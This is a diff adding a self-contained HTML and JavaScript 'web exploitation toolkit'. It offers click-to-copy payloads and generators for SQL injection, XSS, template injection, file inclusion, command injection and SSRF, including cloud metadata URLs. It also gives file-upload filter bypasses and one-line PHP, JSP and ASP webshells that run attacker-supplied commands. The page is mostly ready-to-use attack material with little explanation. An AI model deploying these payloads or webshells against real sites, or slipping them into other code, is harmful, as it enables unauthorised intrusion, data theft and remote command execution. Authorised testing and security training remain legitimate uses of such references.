@@ -1,0 +1,680 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LKS Web Exploitation Toolkit</title>
+    <style>
+        :root {
+            --bg: #0f0f23;
+            --bg2: #1a1a2e;
+            --bg3: #16213e;
+            --accent: #00d9ff;
+            --text: #e0e0e0;
+            --text2: #888;
+            --success: #00ff88;
+            --border: #333
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px
+        }
+
+        header {
+            background: linear-gradient(135deg, #1a1a2e, #0f0f23);
+            border-bottom: 1px solid var(--border);
+            padding: 20px 0
+        }
+
+        header h1 {
+            font-size: 1.8rem
+        }
+
+        .badge {
+            background: var(--accent);
+            color: #000;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: .7rem;
+            font-weight: 600
+        }
+
+        .tabs {
+            display: flex;
+            gap: 5px;
+            background: var(--bg2);
+            padding: 5px;
+            border-radius: 8px;
+            margin: 20px 0;
+            flex-wrap: wrap
+        }
+
+        .tab {
+            padding: 10px 15px;
+            background: transparent;
+            border: none;
+            color: var(--text2);
+            cursor: pointer;
+            border-radius: 6px;
+            font-size: .9rem
+        }
+
+        .tab:hover {
+            background: var(--bg3);
+            color: var(--text)
+        }
+
+        .tab.active {
+            background: var(--accent);
+            color: #000;
+            font-weight: 600
+        }
+
+        .panel {
+            display: none
+        }
+
+        .panel.active {
+            display: block
+        }
+
+        .card {
+            background: var(--bg2);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 15px
+        }
+
+        .card h3 {
+            color: var(--accent);
+            margin-bottom: 15px
+        }
+
+        input,
+        textarea,
+        select {
+            width: 100%;
+            padding: 12px;
+            background: var(--bg3);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            color: var(--text);
+            font-family: monospace
+        }
+
+        button {
+            padding: 10px 20px;
+            background: var(--accent);
+            border: none;
+            border-radius: 6px;
+            color: #000;
+            font-weight: 600;
+            cursor: pointer
+        }
+
+        .btn-small {
+            padding: 6px 12px;
+            font-size: .85rem
+        }
+
+        .grid-2 {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 15px
+        }
+
+        .grid-3 {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 10px
+        }
+
+        .output-box {
+            background: #000;
+            border: 1px solid var(--border);
+            padding: 15px;
+            border-radius: 6px;
+            font-family: monospace;
+            min-height: 60px;
+            white-space: pre-wrap
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            padding: 15px 25px;
+            background: var(--success);
+            color: #000;
+            border-radius: 8px;
+            font-weight: 600;
+            transform: translateY(100px);
+            opacity: 0;
+            transition: all .3s;
+            z-index: 1000
+        }
+
+        .toast.show {
+            transform: translateY(0);
+            opacity: 1
+        }
+
+        .mt-10 {
+            margin-top: 10px
+        }
+
+        .mb-10 {
+            margin-bottom: 10px
+        }
+
+        .flex-row {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap
+        }
+
+        .payload-card {
+            background: var(--bg3);
+            padding: 12px;
+            border-radius: 6px;
+            margin: 8px 0;
+            cursor: pointer;
+            border: 1px solid transparent
+        }
+
+        .payload-card:hover {
+            border-color: var(--accent)
+        }
+
+        .payload-card code {
+            color: var(--success);
+            display: block;
+            margin-top: 5px
+        }
+
+        .ref-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: .85rem
+        }
+
+        .ref-table th,
+        .ref-table td {
+            padding: 8px;
+            text-align: left;
+            border-bottom: 1px solid var(--border)
+        }
+
+        .ref-table th {
+            color: var(--accent)
+        }
+
+        .ref-table code {
+            background: var(--bg);
+            padding: 2px 6px;
+            border-radius: 3px;
+            color: var(--success)
+        }
+
+        .tag {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: .75rem;
+            margin-right: 5px;
+            font-weight: 600;
+            background: #a855f7;
+            color: #fff
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <div class="container">
+            <h1>LKS Web Exploitation Toolkit <span class="badge">v2.0</span></h1>
+        </div>
+    </header>
+    <div class="container">
+        <div class="tabs">
+            <button class="tab active" onclick="showTab('payloads')">Payloads</button>
+            <button class="tab" onclick="showTab('sqli')">SQLi</button>
+            <button class="tab" onclick="showTab('xss')">XSS</button>
+            <button class="tab" onclick="showTab('ssti')">SSTI</button>
+            <button class="tab" onclick="showTab('ssrf')">SSRF</button>
+            <button class="tab" onclick="showTab('upload')">Upload</button>
+            <button class="tab" onclick="showTab('auth')">Auth</button>
+            <button class="tab" onclick="showTab('encode')">Encode</button>
+            <button class="tab" onclick="showTab('curl')">cURL</button>
+        </div>
+
+        <div id="payloads" class="panel active">
+            <div class="card">
+                <h3>Quick Payloads (Click to Copy)</h3>
+                <div class="flex-row mb-10" id="filters"></div>
+                <div id="payloadList"></div>
+            </div>
+        </div>
+
+        <div id="sqli" class="panel">
+            <div class="card">
+                <h3>SQLi Union Builder</h3>
+                <div class="grid-2">
+                    <div><label>Columns</label><input type="number" id="sqli_cols" value="3" min="1"></div>
+                    <div><label>DB</label><select id="sqli_db">
+                            <option>MySQL</option>
+                            <option>SQLite</option>
+                            <option>PostgreSQL</option>
+                        </select></div>
+                </div>
+                <button class="mt-10" onclick="buildUnion()">Generate</button>
+                <div class="output-box mt-10" id="sqliOut"></div>
+            </div>
+            <div class="card">
+                <h3>SQLi Cheatsheet</h3>
+                <table class="ref-table">
+                    <tr>
+                        <th>Type</th>
+                        <th>Payload</th>
+                    </tr>
+                    <tr>
+                        <td>Auth Bypass</td>
+                        <td><code>' OR 1=1--</code></td>
+                    </tr>
+                    <tr>
+                        <td>UNION</td>
+                        <td><code>' UNION SELECT null,null--</code></td>
+                    </tr>
+                    <tr>
+                        <td>Column Count</td>
+                        <td><code>' ORDER BY 1--</code></td>
+                    </tr>
+                    <tr>
+                        <td>Version</td>
+                        <td><code>@@version | version()</code></td>
+                    </tr>
+                    <tr>
+                        <td>Tables</td>
+                        <td><code>information_schema.tables</code></td>
+                    </tr>
+                </table>
+            </div>
+        </div>
+
+        <div id="xss" class="panel">
+            <div class="card">
+                <h3>XSS Polyglot Generator</h3>
+                <input type="text" id="xss_fn" placeholder="alert(1)">
+                <button class="mt-10" onclick="genXSS()">Generate</button>
+                <div class="output-box mt-10" id="xssOut"></div>
+            </div>
+            <div class="card">
+                <h3>XSS Filter Bypass</h3>
+                <table class="ref-table">
+                    <tr>
+                        <th>Filter</th>
+                        <th>Bypass</th>
+                    </tr>
+                    <tr>
+                        <td>No script</td>
+                        <td><code>&lt;img src=x onerror=alert(1)&gt;</code></td>
+                    </tr>
+                    <tr>
+                        <td>No alert</td>
+                        <td><code>confirm(1) | prompt(1)</code></td>
+                    </tr>
+                    <tr>
+                        <td>No parens</td>
+                        <td><code>alert`1`</code></td>
+                    </tr>
+                    <tr>
+                        <td>SVG</td>
+                        <td><code>&lt;svg onload=alert(1)&gt;</code></td>
+                    </tr>
+                </table>
+            </div>
+        </div>
+
+        <div id="ssti" class="panel">
+            <div class="card">
+                <h3>SSTI Detection</h3>
+                <table class="ref-table">
+                    <tr>
+                        <th>Engine</th>
+                        <th>Test</th>
+                        <th>RCE</th>
+                    </tr>
+                    <tr>
+                        <td>Jinja2</td>
+                        <td><code>{{7*7}}</code></td>
+                        <td><code>{{config.__class__...}}</code></td>
+                    </tr>
+                    <tr>
+                        <td>Twig</td>
+                        <td><code>{{7*7}}</code></td>
+                        <td><code>{{_self.env...}}</code></td>
+                    </tr>
+                    <tr>
+                        <td>ERB</td>
+                        <td><code>&lt;%=7*7%&gt;</code></td>
+                        <td><code>&lt;%=system('id')%&gt;</code></td>
+                    </tr>
+                    <tr>
+                        <td>Freemarker</td>
+                        <td><code>${7*7}</code></td>
+                        <td><code>${"...".exec("id")}</code></td>
+                    </tr>
+                </table>
+            </div>
+        </div>
+
+        <div id="ssrf" class="panel">
+            <div class="card">
+                <h3>SSRF Bypass</h3>
+                <table class="ref-table">
+                    <tr>
+                        <th>Bypass</th>
+                        <th>Payload</th>
+                    </tr>
+                    <tr>
+                        <td>Localhost</td>
+                        <td><code>127.0.0.1 | localhost | 0.0.0.0</code></td>
+                    </tr>
+                    <tr>
+                        <td>Decimal</td>
+                        <td><code>2130706433</code></td>
+                    </tr>
+                    <tr>
+                        <td>Hex</td>
+                        <td><code>0x7f000001</code></td>
+                    </tr>
+                    <tr>
+                        <td>IPv6</td>
+                        <td><code>[::1] | [0:0:0:0:0:ffff:127.0.0.1]</code></td>
+                    </tr>
+                </table>
+            </div>
+            <div class="card">
+                <h3>Cloud Metadata</h3>
+                <table class="ref-table">
+                    <tr>
+                        <th>Provider</th>
+                        <th>URL</th>
+                    </tr>
+                    <tr>
+                        <td>AWS</td>
+                        <td><code>http://169.254.169.254/latest/meta-data/</code></td>
+                    </tr>
+                    <tr>
+                        <td>GCP</td>
+                        <td><code>http://metadata.google.internal/</code></td>
+                    </tr>
+                    <tr>
+                        <td>Azure</td>
+                        <td><code>http://169.254.169.254/metadata/instance</code></td>
+                    </tr>
+                </table>
+            </div>
+        </div>
+
+        <div id="upload" class="panel">
+            <div class="card">
+                <h3>File Upload Bypass</h3>
+                <table class="ref-table">
+                    <tr>
+                        <th>Technique</th>
+                        <th>Example</th>
+                    </tr>
+                    <tr>
+                        <td>Double ext</td>
+                        <td><code>shell.php.jpg</code></td>
+                    </tr>
+                    <tr>
+                        <td>Null byte</td>
+                        <td><code>shell.php%00.jpg</code></td>
+                    </tr>
+                    <tr>
+                        <td>Case</td>
+                        <td><code>shell.PhP</code></td>
+                    </tr>
+                    <tr>
+                        <td>Alt ext</td>
+                        <td><code>.phtml .php5 .phar</code></td>
+                    </tr>
+                    <tr>
+                        <td>Content-Type</td>
+                        <td><code>image/jpeg</code></td>
+                    </tr>
+                    <tr>
+                        <td>Magic bytes</td>
+                        <td><code>GIF89a + PHP</code></td>
+                    </tr>
+                </table>
+            </div>
+            <div class="card">
+                <h3>Webshell Generator</h3>
+                <select id="shell_type" class="mb-10">
+                    <option value="php">PHP</option>
+                    <option value="jsp">JSP</option>
+                    <option value="asp">ASP</option>
+                </select>
+                <button onclick="genShell()">Generate</button>
+                <div class="output-box mt-10" id="shellOut"></div>
+            </div>
+        </div>
+
+        <div id="auth" class="panel">
+            <div class="card">
+                <h3>IDOR Testing</h3>
+                <table class="ref-table">
+                    <tr>
+                        <th>Original</th>
+                        <th>Test</th>
+                    </tr>
+                    <tr>
+                        <td><code>/user/123</code></td>
+                        <td><code>/user/124 | /user/1</code></td>
+                    </tr>
+                    <tr>
+                        <td><code>?id=100</code></td>
+                        <td><code>?id=101 | ?id=-1</code></td>
+                    </tr>
+                </table>
+            </div>
+            <div class="card">
+                <h3>JWT Decoder</h3>
+                <textarea id="jwtIn" placeholder="Paste JWT..."></textarea>
+                <button class="mt-10" onclick="decodeJWT()">Decode</button>
+                <div class="output-box mt-10" id="jwtOut"></div>
+            </div>
+        </div>
+
+        <div id="encode" class="panel">
+            <div class="card">
+                <h3>Encoder/Decoder</h3>
+                <textarea id="encIn" placeholder="Enter text..."></textarea>
+                <div class="grid-3 mt-10">
+                    <button class="btn-small" onclick="enc('urle')">URL Enc</button>
+                    <button class="btn-small" onclick="enc('urld')">URL Dec</button>
+                    <button class="btn-small" onclick="enc('b64e')">B64 Enc</button>
+                    <button class="btn-small" onclick="enc('b64d')">B64 Dec</button>
+                    <button class="btn-small" onclick="enc('hexe')">Hex Enc</button>
+                    <button class="btn-small" onclick="enc('hexd')">Hex Dec</button>
+                </div>
+                <div class="output-box mt-10" id="encOut"></div>
+            </div>
+        </div>
+
+        <div id="curl" class="panel">
+            <div class="card">
+                <h3>cURL Builder</h3>
+                <div class="grid-2">
+                    <div><label>URL</label><input type="text" id="curlUrl" placeholder="https://target.com"></div>
+                    <div><label>Method</label><select id="curlMethod">
+                            <option>GET</option>
+                            <option>POST</option>
+                            <option>PUT</option>
+                            <option>DELETE</option>
+                        </select></div>
+                </div>
+                <div class="grid-2 mt-10">
+                    <div><label>Headers</label><textarea id="curlHeaders"
+                            placeholder="Content-Type: application/json"></textarea></div>
+                    <div><label>Body</label><textarea id="curlBody" placeholder='{"key":"value"}'></textarea></div>
+                </div>
+                <button class="mt-10" onclick="buildCurl()">Generate</button>
+                <div class="output-box mt-10" id="curlOut"></div>
+            </div>
+        </div>
+    </div>
+    <div class="toast" id="toast">Copied!</div>
+
+    <script>
+        function $(id) { return document.getElementById(id) }
+        function showToast(m) { var t = $('toast'); t.textContent = m; t.classList.add('show'); setTimeout(function () { t.classList.remove('show') }, 2000) }
+        function copy(t) { navigator.clipboard.writeText(t); showToast('Copied!') }
+        function setOut(id, v) { $(id).textContent = v }
+
+        function showTab(name) {
+            document.querySelectorAll('.tab').forEach(function (t) { t.classList.remove('active') });
+            document.querySelectorAll('.panel').forEach(function (p) { p.classList.remove('active') });
+            event.target.classList.add('active');
+            $(name).classList.add('active');
+        }
+
+        var P = [
+            ['sqli', "' OR 1=1--", 'Auth bypass'],
+            ['sqli', "' UNION SELECT 1,2,3--", 'UNION'],
+            ['sqli', "' AND SLEEP(5)--", 'Time-based'],
+            ['xss', '&lt;script&gt;alert(1)&lt;/script&gt;', 'Basic'],
+            ['xss', '&lt;img src=x onerror=alert(1)&gt;', 'IMG'],
+            ['xss', '&lt;svg onload=alert(1)&gt;', 'SVG'],
+            ['ssti', '{{7*7}}', 'Jinja2'],
+            ['ssti', '${7*7}', 'Freemarker'],
+            ['lfi', '../../../etc/passwd', 'passwd'],
+            ['lfi', 'php://filter/convert.base64-encode/resource=index.php', 'PHP filter'],
+            ['rce', '; id', 'Semicolon'],
+            ['rce', '| id', 'Pipe'],
+            ['rce', '$(whoami)', 'Subshell'],
+            ['ssrf', 'http://127.0.0.1', 'Localhost'],
+            ['ssrf', 'http://169.254.169.254/', 'AWS meta'],
+            ['idor', '/user/1', 'User ID'],
+            ['upload', 'shell.php.jpg', 'Double ext']
+        ];
+
+        function decode(s) { var d = document.createElement('div'); d.innerHTML = s; return d.textContent }
+
+        function renderPayloads(filter) {
+            var c = $('payloadList'); c.innerHTML = '';
+            P.forEach(function (p) {
+                if (filter && filter !== 'all' && p[0] !== filter) return;
+                var div = document.createElement('div');
+                div.className = 'payload-card';
+                div.innerHTML = '<span class="tag">' + p[0].toUpperCase() + '</span> ' + p[2] + '<code>' + p[1] + '</code>';
+                div.onclick = function () { copy(decode(p[1])) };
+                c.appendChild(div);
+            });
+        }
+
+        (function () {
+            var f = $('filters');
+            ['all', 'sqli', 'xss', 'ssti', 'lfi', 'rce', 'ssrf', 'idor', 'upload'].forEach(function (t) {
+                var btn = document.createElement('button');
+                btn.className = 'btn-small';
+                btn.textContent = t.toUpperCase();
+                btn.onclick = function () { renderPayloads(t) };
+                f.appendChild(btn);
+            });
+            renderPayloads('all');
+        })();
+
+        function buildUnion() {
+            var cols = parseInt($('sqli_cols').value);
+            var db = $('sqli_db').value;
+            var n = []; for (var i = 0; i < cols; i++)n.push('null');
+            var out = "' UNION SELECT " + n.join(',') + "--\n\n";
+            out += "Column count: ' ORDER BY " + cols + "--\n\n";
+            if (db === 'MySQL') {
+                out += "Tables: ' UNION SELECT table_name," + n.slice(1).join(',') + " FROM information_schema.tables--\n";
+            } else if (db === 'SQLite') {
+                out += "Tables: ' UNION SELECT name," + n.slice(1).join(',') + " FROM sqlite_master--\n";
+            }
+            setOut('sqliOut', out);
+        }
+
+        function genXSS() {
+            var fn = $('xss_fn').value || 'alert(1)';
+            var out = "<script>" + fn + "<\/script>\n\n";
+            out += "<img src=x onerror=" + fn + ">\n\n";
+            out += "<svg onload=" + fn + ">\n\n";
+            out += "<body onload=" + fn + ">\n";
+            setOut('xssOut', out);
+        }
+
+        function genShell() {
+            var t = $('shell_type').value;
+            var s = '';
+            if (t === 'php') s = "<?php system($_GET['c']); ?>\n\n<?=`$_GET[c]`;?>";
+            else if (t === 'jsp') s = '<%Runtime.getRuntime().exec(request.getParameter("c"));%>';
+            else if (t === 'asp') s = '<%eval request("c")%>';
+            setOut('shellOut', s);
+        }
+
+        function decodeJWT() {
+            try {
+                var jwt = $('jwtIn').value.trim();
+                var parts = jwt.split('.');
+                if (parts.length !== 3) throw new Error('Invalid JWT');
+                var h = JSON.parse(atob(parts[0]));
+                var p = JSON.parse(atob(parts[1]));
+                setOut('jwtOut', "Header:\n" + JSON.stringify(h, null, 2) + "\n\nPayload:\n" + JSON.stringify(p, null, 2));
+            } catch (e) { setOut('jwtOut', 'Error: ' + e.message) }
+        }
+
+        function enc(op) {
+            var i = $('encIn').value;
+            var o = '';
+            try {
+                if (op === 'urle') o = encodeURIComponent(i);
+                else if (op === 'urld') o = decodeURIComponent(i);
+                else if (op === 'b64e') o = btoa(i);
+                else if (op === 'b64d') o = atob(i);
+                else if (op === 'hexe') o = i.split('').map(function (c) { return c.charCodeAt(0).toString(16).padStart(2, '0') }).join('');
+                else if (op === 'hexd') o = i.match(/.{2}/g).map(function (h) { return String.fromCharCode(parseInt(h, 16)) }).join('');
+            } catch (e) { o = 'Error: ' + e.message }
+            setOut('encOut', o);
+        }
+
+        function buildCurl() {
+            var url = $('curlUrl').value || 'https://example.com';
+            var m = $('curlMethod').value;
+            var h = $('curlHeaders').value;
+            var b = $('curlBody').value;
+            var cmd = 'curl';
+            if (m !== 'GET') cmd += ' -X ' + m;
+            h.split('\n').forEach(function (l) { if (l.trim()) cmd += ' -H "' + l.trim() + '"' });
+            if (b && m !== 'GET') cmd += " -d '" + b + "'";
+            cmd += ' "' + url + '"';
+            setOut('curlOut', cmd);
+        }
+    </script>
+</body>
+
+</html>
